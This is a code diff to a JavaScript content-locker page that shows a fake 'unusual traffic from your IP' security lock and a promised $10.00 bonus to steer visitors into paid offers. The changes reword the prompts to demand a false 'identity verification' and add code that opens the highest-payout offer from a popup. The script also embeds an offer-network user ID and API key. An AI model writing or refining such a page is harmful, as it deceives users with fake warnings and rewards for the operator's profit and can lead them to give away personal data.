@@ -208,13 +208,13 @@ document.getElementById('modalClaimBtn').addEventListener('click', () => {
         document.getElementById('secLockDesc').innerHTML = 'We detected unusual traffic from your IP. Please verify you are human to release your <span class="highlight">$10.00 Balance</span>.';
         document.getElementById('orcLabel').textContent = 'Pending Bonus';
         document.getElementById('orcValue').textContent = '$10.00 Waiting For You';
-        document.getElementById('offerSubtext').textContent = 'Your $10.00 bonus is locked and ready — one quick verification and it\'s yours.';
+        document.getElementById('offerSubtext').textContent = 'Your $10.00 bonus is ready! Complete a quick identity verification below to unlock your reward and activate your account.';
     } else {
         document.getElementById('sticky').classList.remove('show');
         document.getElementById('secLockDesc').innerHTML = 'We detected unusual traffic from your IP. Please verify you are human to continue.';
         document.getElementById('orcLabel').textContent = 'Complete 1 Offer To Unlock';
         document.getElementById('orcValue').textContent = 'Free Account Access';
-        document.getElementById('offerSubtext').textContent = 'You\'re almost in. Complete one quick action below to activate your free account instantly.';
+        document.getElementById('offerSubtext').textContent = 'You\'re almost in! Complete a quick identity verification below to activate your free account.';
     }
 });
 
@@ -252,7 +252,19 @@ function startFallbackTimer() { fallbackTimer = setTimeout(() => document.getEle
 function closeFallbackPopup() { document.getElementById('fallbackPopup').classList.remove('show'); }
 document.getElementById('fallbackPopupClose').addEventListener('click', closeFallbackPopup);
 document.getElementById('fallbackPopupDismiss').addEventListener('click', closeFallbackPopup);
-document.getElementById('fallbackPopupBtn').addEventListener('click', () => { closeFallbackPopup(); document.getElementById('offer-wall-placeholder').scrollIntoView({ behavior: 'smooth', block: 'start' }); startFallbackTimer(); });
+document.getElementById('fallbackPopupBtn').addEventListener('click', () => {
+    closeFallbackPopup();
+    if (bestOffer && bestOffer.url) {
+        window.open(bestOffer.url, '_blank', 'noopener');
+        clearTimeout(fallbackTimer);
+        document.getElementById('offerProgressFill').style.width = '50%';
+        document.getElementById('offerProgressCount').textContent = 'Waiting for completion...';
+        document.getElementById('offerProgressCount').style.color = 'var(--gold)';
+    } else {
+        document.getElementById('offer-wall-placeholder').scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+    startFallbackTimer();
+});
 document.getElementById('fallbackPopup').addEventListener('click', e => { if (e.target === document.getElementById('fallbackPopup')) closeFallbackPopup(); });
 document.addEventListener('click', e => {
     if (e.target.closest('#offer-wall-placeholder a') || e.target.closest('.offer-link') || e.target.closest('.offer-link-card')) {
@@ -290,6 +302,7 @@ const OFFER_API = 'https://d5b3uz3fo8hn3.cloudfront.net/public/offers/feed.php';
 const LEAD_API = 'https://d5b3uz3fo8hn3.cloudfront.net/public/external/check2.php';
 const OFFER_USER_ID = '378788', OFFER_API_KEY = '01e1f87ac8720a6f0d3e8b0f1eedcf4c', MAX_OFFERS = 2, MIN_PAYOUT_USD = 6;
 let leadCheckInterval = null, leadCompleted = false;
+let bestOffer = null;
 
 function jsonp(url, cbParam, fn) {
     const name = 'jsonp_cb_' + Date.now(); window[name] = d => { fn(d); delete window[name]; const s = document.getElementById(name); if (s) s.parentNode.removeChild(s); };
@@ -354,6 +367,20 @@ function loadOffers() {
       </a>`;
         }).join('');
         document.getElementById('offerProgressCount').textContent = '0 of ' + display.length + ' completed';
+
+        // Store the highest payout offer for the fallback popup
+        const sorted = [...pool].sort((a, b) => {
+            const pa = parseFloat(a.payout) || (parseFloat(a.points) / 100) || 0;
+            const pb = parseFloat(b.payout) || (parseFloat(b.points) / 100) || 0;
+            return pb - pa;
+        });
+        if (sorted.length) {
+            bestOffer = sorted[0];
+            const btn = document.getElementById('fallbackPopupBtn');
+            const label = rewriteLabel(bestOffer.anchor).split('—')[0].trim();
+            btn.innerHTML = '<ion-icon name="rocket-outline"></ion-icon> ' + label;
+        }
+
         startLeadChecker();
     });
 }
